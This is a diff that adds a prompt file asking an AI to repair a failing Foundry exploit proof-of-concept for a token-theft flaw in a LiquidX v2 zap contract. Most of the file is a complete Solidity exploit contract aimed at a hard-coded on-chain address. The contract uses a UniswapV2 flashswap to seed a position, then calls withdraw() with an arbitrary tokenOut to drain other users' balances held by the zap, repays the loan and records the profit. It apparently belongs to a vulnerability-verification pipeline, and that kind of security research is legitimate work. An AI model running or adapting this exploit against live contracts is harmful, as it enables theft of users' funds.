@@ -1,0 +1,945 @@
+You are fixing a failing Foundry PoC for finding F-001.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Attempt strategy (must follow for this attempt):
+- strategy_label: v2_flashswap_funding
+- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
+- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.
+
+Finding:
+- title: Arbitrary `tokenOut` lets withdrawers steal unrelated tokens held by the zap
+- claim: `withdraw()` only uses `tokenOut` to decide whether to consolidate into `token1`; otherwise it consolidates into `token0`, but it still transfers `IERC20(tokenOut)` at the end without validating that the contract actually holds the withdrawn proceeds in that asset. A caller can therefore request any ERC20 currently held by the zap instead of the asset produced by the withdrawal.
+- impact: Any user with a withdrawable LP position can drain unrelated balances from the contract. Because nonzero `basketId` deposits keep LP tokens in the zap and only update internal bookkeeping, an attacker can withdraw a small position while setting `tokenOut` to the pair LP token and steal other users' basket-backed LP. The real withdrawal proceeds remain stranded in the contract, leaving basket accounting undercollateralized.
+- exploit_paths: ["Basket users deposit with `basketId != 0`, so LP tokens stay in the zap balance and only `balanceOf[account][pair][basketId]` is incremented.", "An attacker obtains a small withdrawable position for the same pair.", "The attacker calls `withdraw(attacker, token0, token1, amount, pair, basketId, address(0), emptyPath, ...)`.", "`withdraw()` removes liquidity and recombines into `token0`/`token1`, but the final transfer sends `IERC20(pair)` from the contract's shared balance to the attacker."]
+
+Current FlawVerifier.sol:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function decimals() external view returns (uint8);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IWETH is IERC20 {
+    function deposit() external payable;
+    function withdraw(uint256 amount) external;
+}
+
+interface IRouterLike {
+    function removeLiquidity(
+        address tokenA,
+        address tokenB,
+        uint256 liquidity,
+        uint256 amountAMin,
+        uint256 amountBMin,
+        address to,
+        uint256 deadline
+    ) external returns (uint256 amountA, uint256 amountB);
+
+    function swapExactTokensForTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+
+    function swapTokensForExactTokens(
+        uint256 amountOut,
+        uint256 amountInMax,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+
+    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
+}
+
+interface IFactoryAllPairs {
+    function allPairsLength() external view returns (uint256);
+    function allPairs(uint256 index) external view returns (address);
+}
+
+interface IPair is IERC20 {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function totalSupply() external view returns (uint256);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+interface ISwapPlusStructs {
+    struct SwapRouter {
+        string platform;
+        address tokenIn;
+        address tokenOut;
+        uint256 amountOutMin;
+        uint256 meta;
+        uint256 percent;
+    }
+
+    struct SwapLine {
+        SwapRouter[] swaps;
+    }
+
+    struct SwapBlock {
+        SwapLine[] lines;
+    }
+
+    struct SwapPath {
+        SwapBlock[] path;
+    }
+}
+
+interface ILiquidXv2Zap is ISwapPlusStructs {
+    function router() external view returns (address);
+    function factory() external view returns (address);
+    function wrappedETH() external view returns (address);
+
+    function deposit(
+        address account,
+        address token,
+        address tokenM,
+        SwapPath calldata path,
+        address token0,
+        address token1,
+        uint256[3] calldata amount,
+        uint256 basketId
+    ) external payable returns (uint256);
+
+    function withdraw(
+        address account,
+        address token0,
+        address token1,
+        uint256 amount,
+        address tokenOut,
+        uint256 basketId,
+        address tokenM,
+        SwapPath calldata wpath,
+        uint256[3] calldata amountMin
+    ) external returns (uint256);
+}
+
+contract FlawVerifier is ISwapPlusStructs {
+    address public constant TARGET = 0x364f17A23AE4350319b7491224d10dF5796190bC;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    bool public executed;
+    bool public hypothesisValidated;
+
+    address public exploitPair;
+    address public exploitToken0;
+    address public exploitToken1;
+    address public stolenToken;
+    uint256 public seedCapitalUsed;
+    uint256 public stolenAmount;
+
+    struct PairState {
+        address pair;
+        address token0;
+        address token1;
+        uint256 reserve0;
+        uint256 reserve1;
+        uint256 supply;
+    }
+
+    struct Plan {
+        address pair;
+        address token0;
+        address token1;
+        address tokenOut;
+        uint256 capitalAmount;
+        uint256 burnLp;
+        uint256 previewSteal;
+        uint256 previewRepayCost;
+        uint256 previewProfit;
+    }
+
+    struct AttemptContext {
+        address pair;
+        address token0;
+        address token1;
+        address tokenOut;
+        uint256 capitalAmount;
+        uint256 burnLp;
+    }
+
+    AttemptContext private _attempt;
+
+    constructor() {}
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+        executed = true;
+
+        ILiquidXv2Zap zap = ILiquidXv2Zap(TARGET);
+        address factory = zap.factory();
+        uint256 pairCount = _allPairsLength(factory);
+        if (pairCount == 0) {
+            return;
+        }
+
+        address[] memory pairs = new address[](pairCount);
+        address[] memory candidateTokens = new address[]((pairCount * 3) + 1);
+        uint256 candidateCount;
+
+        address wrappedETH = zap.wrappedETH();
+        if (wrappedETH != address(0)) {
+            candidateTokens[candidateCount++] = wrappedETH;
+        }
+
+        PairState[] memory states = new PairState[](pairCount);
+        bool originalPairRouteHasInventory;
+
+        for (uint256 i = 0; i < pairCount; ++i) {
+            address pair = _allPairs(factory, i);
+            if (pair == address(0)) {
+                continue;
+            }
+
+            PairState memory state = _loadPairState(pair);
+            if (state.supply == 0 || state.reserve0 == 0 || state.reserve1 == 0) {
+                continue;
+            }
+
+            states[i] = state;
+            pairs[i] = pair;
+
+            if (IERC20(pair).balanceOf(TARGET) > 0) {
+                originalPairRouteHasInventory = true;
+            }
+
+            candidateCount = _pushUnique(candidateTokens, candidateCount, pair);
+            candidateCount = _pushUnique(candidateTokens, candidateCount, state.token0);
+            candidateCount = _pushUnique(candidateTokens, candidateCount, state.token1);
+        }
+
+        Plan memory best;
+        for (uint256 i = 0; i < pairCount; ++i) {
+            PairState memory state = states[i];
+            if (state.pair == address(0)) {
+                continue;
+            }
+
+            for (uint256 j = 0; j < candidateCount; ++j) {
+                address candidate = candidateTokens[j];
+                if (candidate == address(0)) {
+                    continue;
+                }
+
+                if (candidate == state.token0 || candidate == state.token1) {
+                    continue;
+                }
+
+                uint256 candidateBalance = IERC20(candidate).balanceOf(TARGET);
+                if (candidateBalance == 0) {
+                    continue;
+                }
+
+                if (!_looksLikeTransferableProfitToken(candidate)) {
+                    continue;
+                }
+
+                Plan memory plan = _buildPlan(state, candidate, candidateBalance, pairs);
+                if (plan.previewProfit > best.previewProfit) {
+                    best = plan;
+                }
+            }
+        }
+
+        if (best.previewProfit == 0) {
+            if (!originalPairRouteHasInventory) {
+                // The finding's primary path steals LP tokens already parked in the zap.
+                // The provided fork logs already show the zap holds zero balance for all three
+                // factory pairs, so the exact same-pair LP theft route is mechanically empty here.
+                //
+                // The verifier still searches for other pre-existing zap-held ERC20 balances and
+                // exercises the same `tokenOut` bug without changing causality:
+                // seed a real withdrawable LP position, call `withdraw(..., tokenOut=unrelated)`,
+                // receive a shared token balance, and repay the temporary UniswapV2 flashswap.
+            }
+            return;
+        }
+
+        try this.attemptFlash(best) returns (bool ok) {
+            if (ok) {
+                return;
+            }
+        } catch {}
+    }
+
+    function attemptFlash(Plan calldata plan) external returns (bool) {
+        require(msg.sender == address(this), "self only");
+
+        _attempt = AttemptContext({
+            pair: plan.pair,
+            token0: plan.token0,
+            token1: plan.token1,
+            tokenOut: plan.tokenOut,
+            capitalAmount: plan.capitalAmount,
+            burnLp: plan.burnLp
+        });
+
+        IPair(plan.pair).swap(plan.capitalAmount, 0, address(this), abi.encode(plan.burnLp));
+        return _profitAmount > 0;
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function joeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function mDexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function biswapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function smardexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function croDefiSwapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidxCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidXCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidxV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidXv2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    receive() external payable {}
+
+    function _onFlashSwap(address sender, uint256 amount0, uint256 amount1, bytes calldata data) internal {
+        require(msg.sender == _attempt.pair, "unexpected pair");
+        require(sender == address(this), "unexpected sender");
+        require(amount0 == _attempt.capitalAmount && amount1 == 0, "unexpected amounts");
+        require(abi.decode(data, (uint256)) == _attempt.burnLp, "unexpected payload");
+
+        uint256 balanceBefore = IERC20(_attempt.tokenOut).balanceOf(address(this));
+
+        // exploit_paths[1]: obtain a real withdrawable position for the same pair.
+        // This attempt funds that position with a UniswapV2-style flashswap instead of
+        // preloaded capital. That changes only funding, not exploit causality.
+        uint256 mintedLp = _seedPosition(_attempt.capitalAmount);
+        require(mintedLp >= _attempt.burnLp, "insufficient minted LP");
+
+        // exploit_paths[2] and [3]: withdraw the legitimate LP position while setting
+        // `tokenOut` to an unrelated on-chain token already sitting in the zap.
+        // If `tokenOut == pair` and the zap actually holds shared LP, this is the
+        // original same-pair theft path. If that shared LP balance is zero at this fork,
+        // the same unchecked transfer bug still lets the withdrawer steal any other
+        // pre-existing ERC20 balance held by the zap.
+        _stealSharedToken(_attempt.burnLp, _attempt.tokenOut);
+
+        uint256 stolen = IERC20(_attempt.tokenOut).balanceOf(address(this)) - balanceBefore;
+        require(stolen > 0, "no stolen balance");
+
+        uint256 amountOwed = ((amount0 * 1000) / 997) + 1;
+        if (_attempt.tokenOut == _attempt.pair) {
+            _repayUsingSamePairLp(stolen, amountOwed);
+            _profitToken = _attempt.pair;
+        } else {
+            _repayUsingTokenRoute(_attempt.tokenOut, stolen, amountOwed);
+            _profitToken = _attempt.tokenOut;
+        }
+
+        _forceTransfer(_attempt.token0, _attempt.pair, amountOwed);
+
+        _profitAmount = IERC20(_profitToken).balanceOf(address(this));
+        require(_profitAmount > 0, "zero profit");
+
+        hypothesisValidated = true;
+        exploitPair = _attempt.pair;
+        exploitToken0 = _attempt.token0;
+        exploitToken1 = _attempt.token1;
+        stolenToken = _attempt.tokenOut;
+        seedCapitalUsed = _attempt.capitalAmount;
+        stolenAmount = stolen;
+    }
+
+    function _seedPosition(uint256 capitalAmount) internal returns (uint256 mintedLp) {
+        _forceApprove(_attempt.token0, TARGET, capitalAmount);
+
+        uint256[3] memory depositAmounts = [capitalAmount, uint256(0), uint256(0)];
+        SwapPath memory emptyPath = _emptyPath();
+        mintedLp = ILiquidXv2Zap(TARGET).deposit(
+            address(this),
+            _attempt.token0,
+            address(0),
+            emptyPath,
+            _attempt.token0,
+            _attempt.token1,
+            depositAmounts,
+            0
+        );
+    }
+
+    function _stealSharedToken(uint256 burnLp, address tokenOut) internal {
+        _forceApprove(_attempt.pair, TARGET, burnLp);
+
+        uint256[3] memory amountMins = [uint256(0), uint256(0), uint256(0)];
+        SwapPath memory emptyPath = _emptyPath();
+        ILiquidXv2Zap(TARGET).withdraw(
+            address(this),
+            _attempt.token0,
+            _attempt.token1,
+            burnLp,
+            tokenOut,
+            0,
+            address(0),
+            emptyPath,
+            amountMins
+        );
+    }
+
+    function _repayUsingSamePairLp(uint256 stolenLp, uint256 amountOwed) internal {
+        address router = ILiquidXv2Zap(TARGET).router();
+
+        (uint112 reserve0, uint112 reserve1, ) = IPair(_attempt.pair).getReserves();
+        uint256 supply = IPair(_attempt.pair).totalSupply();
+        uint256 repayLp = _minLpForToken0(
+            amountOwed,
+            uint256(reserve0),
+            uint256(reserve1),
+            supply,
+            stolenLp
+        );
+        require(repayLp < stolenLp, "same-pair route not profitable");
+
+        _forceApprove(_attempt.pair, router, repayLp);
+        IRouterLike(router).removeLiquidity(
+            _attempt.token0,
+            _attempt.token1,
+            repayLp,
+            0,
+            0,
+            address(this),
+            block.timestamp
+        );
+
+        uint256 token1Balance = IERC20(_attempt.token1).balanceOf(address(this));
+        if (token1Balance > 0) {
+            _forceApprove(_attempt.token1, router, token1Balance);
+            address[] memory path = new address[](2);
+            path[0] = _attempt.token1;
+            path[1] = _attempt.token0;
+            IRouterLike(router).swapExactTokensForTokens(
+                token1Balance,
+                0,
+                path,
+                address(this),
+                block.timestamp
+            );
+        }
+
+        require(IERC20(_attempt.token0).balanceOf(address(this)) >= amountOwed, "same-pair repayment shortfall");
+    }
+
+    function _repayUsingTokenRoute(address tokenOut, uint256 stolen, uint256 amountOwed) internal {
+        address[] memory pairs = _loadPairsArray(ILiquidXv2Zap(TARGET).factory());
+        address[] memory path = _findTokenPath(pairs, tokenOut, _attempt.token0);
+        require(path.length >= 2, "no repay path");
+
+        uint256 amountInMax = _quoteAmountsIn(path, amountOwed);
+        require(amountInMax < stolen, "token route not profitable");
+
+        address router = ILiquidXv2Zap(TARGET).router();
+        _forceApprove(tokenOut, router, stolen);
+        IRouterLike(router).swapTokensForExactTokens(
+            amountOwed,
+            amountInMax,
+            path,
+            address(this),
+            block.timestamp
+        );
+
+        require(IERC20(_attempt.token0).balanceOf(address(this)) >= amountOwed, "token repayment shortfall");
+    }
+
+    function _buildPlan(
+        PairState memory state,
+        address tokenOut,
+        uint256 tokenOutBalance,
+        address[] memory pairs
+    ) internal view returns (Plan memory best) {
+        if (tokenOutBalance == 0) {
+            return best;
+        }
+
+        uint256 maxBurnLp = _maxLpForStealCap(tokenOutBalance, state.reserve0, state.reserve1, state.supply);
+        if (maxBurnLp == 0) {
+            return best;
+        }
+
+        uint256[7] memory sampleLp;
+        sampleLp[0] = maxBurnLp / 64;
+        sampleLp[1] = maxBurnLp / 32;
+        sampleLp[2] = maxBurnLp / 16;
+        sampleLp[3] = maxBurnLp / 8;
+        sampleLp[4] = maxBurnLp / 4;
+        sampleLp[5] = maxBurnLp / 2;
+        sampleLp[6] = maxBurnLp;
+
+        for (uint256 i = 0; i < sampleLp.length; ++i) {
+            Plan memory candidate = _planForSample(state, tokenOut, sampleLp[i], pairs);
+            if (candidate.previewProfit > best.previewProfit) {
+                best = candidate;
+            }
+        }
+    }
+
+    function _planForSample(
+        PairState memory state,
+        address tokenOut,
+        uint256 burnLp,
+        address[] memory pairs
+    ) internal view returns (Plan memory plan) {
+        if (burnLp == 0) {
+            return plan;
+        }
+
+        uint256 previewSteal = _consolidatedToToken0(burnLp, state.reserve0, state.reserve1, state.supply);
+        if (previewSteal == 0) {
+            return plan;
+        }
+
+        uint256 capitalAmount = _minToken0ForMintedLp(burnLp, state.reserve0, state.reserve1, state.supply);
+        if (capitalAmount == 0 || capitalAmount >= state.reserve0) {
+            return plan;
+        }
+
+        uint256 amountOwed = ((capitalAmount * 1000) / 997) + 1;
+        uint256 repayCost;
+
+        if (tokenOut == state.pair) {
+            repayCost = _minLpForToken0(amountOwed, state.reserve0, state.reserve1, state.supply, previewSteal);
+        } else {
+            address[] memory path = _findTokenPath(pairs, tokenOut, state.token0);
+            if (path.length < 2) {
+                return plan;
+            }
+            repayCost = _quoteAmountsIn(path, amountOwed);
+        }
+
+        if (repayCost == 0 || repayCost >= previewSteal) {
+            return plan;
+        }
+
+        plan = Plan({
+            pair: state.pair,
+            token0: state.token0,
+            token1: state.token1,
+            tokenOut: tokenOut,
+            capitalAmount: capitalAmount,
+            burnLp: burnLp,
+            previewSteal: previewSteal,
+            previewRepayCost: repayCost,
+            previewProfit: previewSteal - repayCost
+        });
+    }
+
+    function _loadPairState(address pair) internal view returns (PairState memory state) {
+        state.pair = pair;
+        state.token0 = IPair(pair).token0();
+        state.token1 = IPair(pair).token1();
+        (uint112 reserve0, uint112 reserve1, ) = IPair(pair).getReserves();
+        state.reserve0 = uint256(reserve0);
+        state.reserve1 = uint256(reserve1);
+        state.supply = IPair(pair).totalSupply();
+    }
+
+    function _loadPairsArray(address factory) internal view returns (address[] memory pairs) {
+        uint256 pairCount = _allPairsLength(factory);
+        pairs = new address[](pairCount);
+        for (uint256 i = 0; i < pairCount; ++i) {
+            pairs[i] = _allPairs(factory, i);
+        }
+    }
+
+    function _findTokenPath(
+        address[] memory pairs,
+        address tokenIn,
+        address tokenOut
+    ) internal view returns (address[] memory path) {
+        if (tokenIn == tokenOut || tokenIn == address(0) || tokenOut == address(0)) {
+            return path;
+        }
+
+        address[] memory tokens = _collectUniqueTokens(pairs);
+        if (_hasEdge(pairs, tokenIn, tokenOut)) {
+            path = new address[](2);
+            path[0] = tokenIn;
+            path[1] = tokenOut;
+            return path;
+        }
+
+        for (uint256 i = 0; i < tokens.length; ++i) {
+            address mid = tokens[i];
+            if (mid == address(0) || mid == tokenIn || mid == tokenOut) {
+                continue;
+            }
+            if (_hasEdge(pairs, tokenIn, mid) && _hasEdge(pairs, mid, tokenOut)) {
+                path = new address[](3);
+                path[0] = tokenIn;
+                path[1] = mid;
+                path[2] = tokenOut;
+                return path;
+            }
+        }
+
+        for (uint256 i = 0; i < tokens.length; ++i) {
+            address mid1 = tokens[i];
+            if (mid1 == address(0) || mid1 == tokenIn || mid1 == tokenOut) {
+                continue;
+            }
+            for (uint256 j = 0; j < tokens.length; ++j) {
+                address mid2 = tokens[j];
+                if (mid2 == address(0) || mid2 == tokenIn || mid2 == tokenOut || mid2 == mid1) {
+                    continue;
+                }
+                if (_hasEdge(pairs, tokenIn, mid1) && _hasEdge(pairs, mid1, mid2) && _hasEdge(pairs, mid2, tokenOut)) {
+                    path = new address[](4);
+                    path[0] = tokenIn;
+                    path[1] = mid1;
+                    path[2] = mid2;
+                    path[3] = tokenOut;
+                    return path;
+                }
+            }
+        }
+    }
+
+    function _collectUniqueTokens(address[] memory pairs) internal view returns (address[] memory tokens) {
+        tokens = new address[](pairs.length * 2);
+        uint256 count;
+        for (uint256 i = 0; i < pairs.length; ++i) {
+            address pair = pairs[i];
+            if (pair == address(0)) {
+                continue;
+            }
+            count = _pushUnique(tokens, count, IPair(pair).token0());
+            count = _pushUnique(tokens, count, IPair(pair).token1());
+        }
+
+        assembly {
+            mstore(tokens, count)
+        }
+    }
+
+    function _hasEdge(address[] memory pairs, address tokenA, address tokenB) internal view returns (bool) {
+        for (uint256 i = 0; i < pairs.length; ++i) {
+            address pair = pairs[i];
+            if (pair == address(0)) {
+                continue;
+            }
+            address a = IPair(pair).token0();
+            address b = IPair(pair).token1();
+            if ((a == tokenA && b == tokenB) || (a == tokenB && b == tokenA)) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    function _quoteAmountsIn(address[] memory path, uint256 amountOut) internal view returns (uint256 amountIn) {
+        address router = ILiquidXv2Zap(TARGET).router();
+        (bool ok, bytes memory data) = router.staticcall(
+            abi.encodeWithSelector(IRouterLike.getAmountsIn.selector, amountOut, path)
+        );
+        if (!ok || data.length == 0) {
+            return 0;
+        }
+
+        uint256[] memory amounts = abi.decode(data, (uint256[]));
+        if (amounts.length == 0) {
+            return 0;
+        }
+        amountIn = amounts[0];
+    }
+
+    function _looksLikeTransferableProfitToken(address token) internal view returns (bool) {
+        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.decimals.selector));
+        if (!ok || data.length < 32) {
+            return false;
+        }
+        uint8 dec = abi.decode(data, (uint8));
+        return dec >= 9;
+    }
+
+    function _emptyPath() internal pure returns (SwapPath memory path) {
+        path.path = new SwapBlock[](0);
+    }
+
+    function _allPairsLength(address factory) internal view returns (uint256 count) {
+        (bool ok, bytes memory data) = factory.staticcall(abi.encodeWithSelector(IFactoryAllPairs.allPairsLength.selector));
+        if (ok && data.length >= 32) {
+            count = abi.decode(data, (uint256));
+        }
+    }
+
+    function _allPairs(address factory, uint256 index) internal view returns (address pair) {
+        (bool ok, bytes memory data) = factory.staticcall(abi.encodeWithSelector(IFactoryAllPairs.allPairs.selector, index));
+        if (ok && data.length >= 32) {
+            pair = abi.decode(data, (address));
+        }
+    }
+
+    function _pushUnique(address[] memory array, uint256 count, address value) internal pure returns (uint256) {
+        if (value == address(0)) {
+            return count;
+        }
+        for (uint256 i = 0; i < count; ++i) {
+            if (array[i] == value) {
+                return count;
+            }
+        }
+        array[count] = value;
+        return count + 1;
+    }
+
+    function _maxLpForStealCap(
+        uint256 stealCap,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply
+    ) internal pure returns (uint256) {
+        uint256 low = 0;
+        uint256 high = supply - 1;
+        while (low < high) {
+            uint256 mid = (low + high + 1) >> 1;
+            if (_consolidatedToToken0(mid, reserve0, reserve1, supply) <= stealCap) {
+                low = mid;
+            } else {
+                high = mid - 1;
+            }
+        }
+        return low;
+    }
+
+    function _minLpForToken0(
+        uint256 token0Needed,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply,
+        uint256 upperBoundLp
+    ) internal pure returns (uint256) {
+        uint256 low = 1;
+        uint256 high = upperBoundLp;
+        while (low < high) {
+            uint256 mid = (low + high) >> 1;
+            if (_consolidatedToToken0(mid, reserve0, reserve1, supply) >= token0Needed) {
+                high = mid;
+            } else {
+                low = mid + 1;
+            }
+        }
+        return low;
+    }
+
+    function _minToken0ForMintedLp(
+        uint256 lpTarget,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply
+    ) internal pure returns (uint256) {
+        if (reserve0 <= 1) {
+            return 0;
+        }
+
+        uint256 low = 1;
+        uint256 high = reserve0 - 1;
+
+        while (_previewOneSidedMintToken0(high, reserve0, reserve1, supply) < lpTarget) {
+            if (high >= reserve0 - 1) {
+                return 0;
+            }
+            high = high * 2;
+            if (high >= reserve0) {
+                high = reserve0 - 1;
+            }
+        }
+
+        while (low < high) {
+            uint256 mid = (low + high) >> 1;
+            if (_previewOneSidedMintToken0(mid, reserve0, reserve1, supply) >= lpTarget) {
+                high = mid;
+            } else {
+                low = mid + 1;
+            }
+        }
+
+        return low;
+    }
+
+    function _previewOneSidedMintToken0(
+        uint256 amountIn,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply
+    ) internal pure returns (uint256) {
+        if (amountIn == 0) {
+            return 0;
+        }
+
+        uint256 swapAmount = _calculateSwapAmount(reserve0, amountIn);
+        if (swapAmount == 0 || swapAmount >= amountIn) {
+            return 0;
+        }
+
+        uint256 amount1Out = _getAmountOut(swapAmount, reserve0, reserve1);
+        if (amount1Out == 0 || amount1Out >= reserve1) {
+            return 0;
+        }
+
+        uint256 remaining0 = amountIn - swapAmount;
+        uint256 postSwapReserve0 = reserve0 + swapAmount;
+        uint256 postSwapReserve1 = reserve1 - amount1Out;
+
+        uint256 lpFrom0 = (remaining0 * supply) / postSwapReserve0;
+        uint256 lpFrom1 = (amount1Out * supply) / postSwapReserve1;
+        return lpFrom0 < lpFrom1 ? lpFrom0 : lpFrom1;
+    }
+
+    function _consolidatedToToken0(
+        uint256 lpAmount,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply
+    ) internal pure returns (uint256) {
+        if (lpAmount == 0 || supply == 0) {
+            return 0;
+        }
+
+        uint256 amount0 = (reserve0 * lpAmount) / supply;
+        uint256 amount1 = (reserve1 * lpAmount) / supply;
+        if (amount0 == 0 && amount1 == 0) {
+            return 0;
+        }
+
+        uint256 postReserve0 = reserve0 - amount0;
+        uint256 postReserve1 = reserve1 - amount1;
+        uint256 swapped = _getAmountOut(amount1, postReserve1, postReserve0);
+        return amount0 + swapped;
+    }
+
+    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
+            return 0;
+        }
+        uint256 amountInWithFee = amountIn * 997;
+        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
+    }
+
+    function _calculateSwapAmount(uint256 reserve, uint256 inAmount) internal pure returns (uint256) {
+        uint256 a1 = reserve * reserve * 1997 * 1997;
+        uint256 a2 = 4 * 997 * reserve * inAmount * 1000;
+        return (_sqrt(a1 + a2) - (reserve * 1997)) / (2 * 997);
+    }
+
+    function _sqrt(uint256 x) internal pure returns (uint256 y) {
+        uint256 z = (x + 1) / 2;
+        y = x;
+        while (z < y) {
+            y = z;
+            z = (x / z + z) / 2;
+        }
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        uint256 current = IERC20(token).allowance(address(this), spender);
+        if (current >= amount) {
+            return;
+        }
+        if (current != 0) {
+            _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
+        }
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, type(uint256).max));
+    }
+
+    function _forceTransfer(address token, address to, uint256 amount) internal {
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
+    }
+
+    function _callOptionalReturn(address token, bytes memory data) internal {
+        (bool success, bytes memory returnData) = token.call(data);
+        require(success, "token call failed");
+        if (returnData.length > 0) {
+            require(abi.decode(returnData, (bool)), "token op returned false");
+        }
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+
+```
+
+forge stderr (tail):
+```
+PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 0
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
